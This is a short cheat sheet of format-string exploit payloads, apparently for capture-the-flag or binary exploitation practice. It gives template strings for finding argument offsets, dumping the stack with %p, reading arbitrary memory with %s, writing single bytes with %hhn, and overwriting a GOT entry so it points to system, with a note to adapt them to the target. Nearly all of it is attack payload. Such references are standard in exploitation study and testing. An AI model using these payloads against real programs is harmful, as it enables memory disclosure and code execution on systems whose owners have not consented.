# Payload shapes — the concrete format strings

Reference shapes for each primitive — adapt N and the count to the target.

## Offset find

`AAAA.%1$p.%2$p.%3$p...%20$p` — one shot maps 20 args.
`AAAA.%N$p` single — precise.

## Leak

`%p.%p.%p.%p.%p.%p.%p.%p` — stack dump run.

## Arbitrary read

`<8-byte-addr padded to arg boundary>.%N$s` — prints *addr.

## Write low byte 0x41 to *addr

`<8-byte-addr>.%65c.%N$hhn` — count=65 → 0x41 written.

## GOT to system, byte-wise

Four %hhn writes at &got+0..3 (or &got+0..7 for full qword); each
specifier's count low byte = the target byte at that offset.
